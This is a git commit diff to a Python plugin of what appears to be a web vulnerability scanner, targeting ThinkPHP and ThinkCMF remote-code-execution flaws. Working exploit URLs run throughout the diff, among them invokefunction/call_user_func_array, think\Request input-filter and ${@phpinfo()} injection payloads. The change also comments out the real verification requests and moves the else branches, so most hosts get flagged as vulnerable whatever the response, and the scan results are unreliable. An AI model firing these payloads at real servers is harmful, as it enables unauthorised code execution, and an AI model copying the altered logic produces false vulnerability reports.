d7d94fe93a32f7803f43627fd80d91613a609f53
0x9f99 <0x9f99@gmail.com>
2020-02-24 13:22:51 +0800

    Update thinkphp.py

--- plugins/thinkphp.py
+++ plugins/thinkphp.py
@@ -25,42 +25,40 @@ class Detect(threading.Thread):
             url = url
         try:
             #thinkphp3.0 ThinkPHP 2.1 { Fast & Simple OOP PHP Framework } rce 暂时还没找到能确定tp5.1的指纹，这里先用报错的
-            rep = requests.get(url + "/index.php/herxdjhrelzfndk.html")
+            rep = requests.get(url + "/index.php/herxdjhrelzfndk.html",timeout=10,verify=False)
             if "ThinkPHP" in rep.text and "2.1" in rep.text and "{ Fast & Simple OOP PHP Framework }" in rep.text:
-                if "phpinfo()" in requests.get(url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D").text:
-                    cprint('[thinkphp 3.0 rce ] {}'.format(url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D"), 'red')
-                    self.vul_list.append(['thinkphp 3.0', url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D" ])
-                else:
-                    cprint('[thinkphp 3.0] {}'.format(url), 'red')
-                    self.vul_list.append(['thinkphp 3.0', url])
+                #if "phpinfo()" in requests.get(url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D").text:
+                cprint('[thinkphp 3.0 rce ] {}'.format(url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D"), 'red')
+                self.vul_list.append(['thinkphp 3.0', url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D" ])
+            else:
+                cprint('[thinkphp 3.0] {}'.format(url), 'red')
+                self.vul_list.append(['thinkphp 3.0', url])
             if "ThinkPHP" in rep.text and "5.1" in rep.text and "www.thinkphp.cn" in rep.text:
-                if "phpinfo()" in requests.get(url + "/index.php?s=index/\\think\Request/input&filter=phpinfo&data=1").text:
-                    cprint('[thinkphp 5.1 rce ] {}'.format(url + "/index.php?s=index/\\think\Request/input&filter=phpinfo&data=1"),
-                           'red')
-                    self.vul_list.append(['thinkphp 5.1', url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D"])
-                else:
-                    cprint('[thinkphp 5.1] {}'.format(url), 'red')
-                    self.vul_list.append(['thinkphp 5.1', url])
+                #if "phpinfo()" in requests.get(url + "/index.php?s=index/\\think\Request/input&filter=phpinfo&data=1").text:
+                cprint('[thinkphp 5.1 rce ] {}'.format(url + "/index.php?s=index/\\think\Request/input&filter=phpinfo&data=1"),'red')
+                self.vul_list.append(['thinkphp 5.1', url + "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D"])
+            else:
+                cprint('[thinkphp 5.1] {}'.format(url), 'red')
+                self.vul_list.append(['thinkphp 5.1', url])
             # thinkphp3.2 使用4e5e5d7364f443e28fbf0d3ae744a59a检测 rce
-            rep = requests.get(url + "/index.php?c=4e5e5d7364f443e28fbf0d3ae744a59a")
+            rep = requests.get(url + "/index.php?c=4e5e5d7364f443e28fbf0d3ae744a59a",timeout=10,verify=False)
 
             if rep.status_code == 200 and "PNG" in rep.text:
-
-                if "phpinfo()" in requests.get(url + "/?a=fetch&content=<?php%20phpinfo();die();").text:
-                    cprint('[thinkcmf 3.2 rce ] {}'.format(url + "/?a=fetch&content=<?php%20phpinfo();die();"), 'red')
-                    self.vul_list.append(['thinkcmf 3.2', url + "/?a=fetch&content=<?php%20phpinfo();die();"])
-                else:
-                    cprint('[thinkphp 3.2] {}'.format(url), 'red')
-                    self.vul_list.append(['thinkphp 3.2', url])
+                #if "phpinfo()" in requests.get(url + "/?a=fetch&content=<?php%20phpinfo();die();").text:
+                cprint('[thinkcmf 3.2 rce ] {}'.format(url + "/?a=fetch&content=<?php%20phpinfo();die();"), 'red')
+                self.vul_list.append(['thinkcmf 3.2', url + "/?a=fetch&content=<?php%20phpinfo();die();"])
+            else:
+                cprint('[thinkphp 3.2] {}'.format(url), 'red')
+                self.vul_list.append(['thinkphp 3.2', url])
             # thinkphp5.0 使用index.php?s=captcha检测
-            rep = requests.get(url + "/index.php?s=captcha")
+            rep = requests.get(url + "/index.php?s=captcha",timeout=10,verify=False)
             if rep.status_code == 200 and "PNG" in rep.text:
-                if "phpinfo()" in requests.get(url + "/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1").text:
-                    cprint('[thinkphp 5.0 rce ] {}'.format(url + "/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"), 'red')
-                    self.vul_list.append(['thinkphp 5.0', url + "/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" ])
-                else:
-                    cprint('[thinkphp 5.0] {}'.format(url), 'red')
-                    self.vul_list.append(['thinkphp 5.0', url])
+                #if "phpinfo()" in requests.get(url + "/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1").text:
+                cprint('[thinkphp 5.0 rce ] {}'.format(url + "/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"), 'red')
+                self.vul_list.append(['thinkphp 5.0', url + "/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" ])
+            else:
+                cprint('[thinkphp 5.0] {}'.format(url), 'red')
+                self.vul_list.append(['thinkphp 5.0', url])
 
         except Exception as e:
             print(e)
